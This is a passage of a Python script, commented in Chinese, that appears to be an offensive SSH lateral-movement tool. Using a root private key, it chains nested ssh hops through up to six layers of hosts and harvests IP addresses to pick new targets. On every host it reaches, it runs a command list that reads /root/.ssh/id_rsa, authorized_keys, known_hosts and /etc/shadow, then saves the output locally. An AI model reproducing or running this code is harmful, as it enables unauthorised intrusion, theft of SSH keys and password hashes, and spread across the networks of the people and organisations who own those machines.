                            result = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", each)
                            if result:
                                result_all.append(result[0])
                    result_all = list(set(result_all))
                    if result_all:
                        with open(newfilename,'w',encoding='utf-8') as fserver:
                            for each1 in result_all:
                                fserver.write(str(each1)+"\n")

        except SSHException:
            print("[6]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆

#执行cmd_list中的命令                        
def DoCommand_Six(HostIP,server_list):
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    MidIP3 = HostIP.split(",")[3].replace('\n','')
    NewIP = HostIP.split(",")[4].replace('\n','')
    for each in server_list:
        try:
            result_command = []
            print("[6]正在检测：%s -> %s -> %s -> %s -> %s -> %s" % (OldIP,MidIP1,MidIP2,MidIP3,NewIP,each.strip()))
            #CMDList = open(".\cmd_list.txt","r")  #执行文件中的命令
            CMDList = ['whoami','id','ifconfig -a','hostname','cat /root/.ssh/id_rsa','cat /root/.ssh/authorized_keys','cat /root/.ssh/known_hosts','cat /etc/shadow']
            command_test = "ssh -o ConnectTimeout=1 "+MidIP1.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+MidIP2.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+MidIP3.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+NewIP.strip().replace("\n","")+" ssh -o ConnectTimeout=1 "+each.strip().replace("\n","") +" id"
            stdin, stdout, stderr = client.exec_command(command_test)
            DoOut=stdout.read().decode('utf-8') 
            if DoOut =='' :
                pass
            else:
                already_host.append(each.replace('\n','')) 
                for cmddo in CMDList:
                    cmddo1 = cmddo.replace('\n','')
                    cmddo1 = "ssh -o ConnectTimeout=1 "+MidIP1.strip()+" ssh -o ConnectTimeout=1 "+MidIP2.strip()+" ssh -o ConnectTimeout=1 "+MidIP3.strip()+" ssh -o ConnectTimeout=1 "+NewIP.strip()+" ssh -o ConnectTimeout=1 "+each.strip() +" " +cmddo1
                    print("[6]"+cmddo1)
                    stdin, stdout, stderr = client.exec_command(cmddo1)
                    DoOut=stdout.read().decode('utf-8') 
                    if DoOut =='' :
                        pass
                    else:
                        result_cmddo = '"%s" execution result:' % (cmddo1.rstrip());
                        result_command.append(result_cmddo)
                        result_command.append(DoOut)
                        result_command.append("\n")
                filename = "./result"+"//" + each+ ".txt"
                if result_command:
                    with open(filename,'w',encoding='utf-8') as f:
                        for each1 in result_command:
                            each2 = each1.strip()
                            f.write(str(each2)+'\n')  
        except SSHException:
            print("[6]%s 存在SSHException" % each.strip())
            client.close()
            client = SSHClient()
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.load_system_host_keys()
            client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
            
def Ssh_Pkey_Six(HostIP):
    #该HostIP为第一层和第二层IP
    #使用密钥登陆   
    global client
    OldIP = HostIP.split(",")[0].replace('\n','')
    MidIP1 = HostIP.split(",")[1].replace('\n','')
    MidIP2 = HostIP.split(",")[2].replace('\n','')
    MidIP3 = HostIP.split(",")[3].replace('\n','')
    NewIP = HostIP.split(",")[4].replace('\n','')
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    client.connect(hostname=OldIP,port=22,username="root",pkey=Private_key,timeout=1, banner_timeout=15)  #使用密钥登陆
    server_list = []
    filename = "./result"+"//" + NewIP+"//"+ "server_list.txt"
    with open(filename) as fs:
        for each in fs:
            each1 = each.replace('\n','')
            #先做测试。稍后改回。已改回  
            if any(each1 == s for s in already_host):
                pass
            else:
                server_list.append(each1)   
    if server_list=="":
        pass
    else:
        DoCommand_Six(HostIP,server_list)
        Get_Rsa_Six(HostIP,server_list)  
    client.close()
       
#主函数
def main():
    print(banner)
    #处理serverlist  
    deal_server_list(serverfile)
    
    #扫描第一层
    print("=========================================================================")
    print("[1]开始扫描第一层IP")
    for each1 in all_server:
        Ssh_Pkey(each1)
        #保存第二轮需要扫描IP
        Save_Two()

    #扫描第二层
    print("=========================================================================")
    print("[2]开始扫描第二层IP")
    print("[2]succeed_host_Two is %s" % succeed_host_Two)
    for each2 in succeed_host_Two:
        Ssh_Pkey_Two(each2)
        #保存IP路径 
        Save_Route() 
        #保存第三轮需要扫描IP
        Save_Three()
        #保存已经扫描过的IP
        Save_Already()
        
    
    #扫描第三层
    print("=========================================================================")
    print("[3]开始扫描第三层IP")
    print("[3]succeed_host_Three is %s" % succeed_host_Three)
    for each3 in succeed_host_Three:
        Ssh_Pkey_Three(each3)
        #保存IP路径 
        Save_Route() 
        #保存第四轮需要扫描IP
        Save_Four()
        #保存已经扫描过的IP
        Save_Already()
    
    #扫描第四层
    print("=========================================================================")
    print("[4]开始扫描第四层IP")
    print("[4]succeed_host_Four is %s" % succeed_host_Four)
    for each4 in succeed_host_Four:
        Ssh_Pkey_Four(each4)
        #保存IP路径 
        Save_Route() 
        #保存第五轮需要扫描IP
        Save_Five()
        #保存已经扫描过的IP
        Save_Already()
        
    #扫描第五层
    print("=========================================================================")
    print("[5]开始扫描第五层IP")
    print("[5]succeed_host_Five is %s" % succeed_host_Five)
    for each5 in succeed_host_Five:
        Ssh_Pkey_Five(each5)
        #保存IP路径 
        Save_Route() 
        #保存第六轮需要扫描IP
        Save_Six()
        #保存已经扫描过的IP
        Save_Already()
        
    #扫描第六层
    print("=========================================================================")
    print("[6]开始扫描第六层IP")
    print("[6]succeed_host_Six is %s" % succeed_host_Six)
    for each6 in succeed_host_Six:
        Ssh_Pkey_Six(each6)
        #保存IP路径 
        Save_Route() 
        #保存第七轮需要扫描IP
        Save_Seven()
        #保存已经扫描过的IP
        Save_Already()
    print("=========================================================================")
    
    
if __name__ == "__main__":
    #判断程序运行事件
    start = time.process_time()
    main()
    end = time.process_time()
    print("The function spend time is %.3f seconds" %(end-start))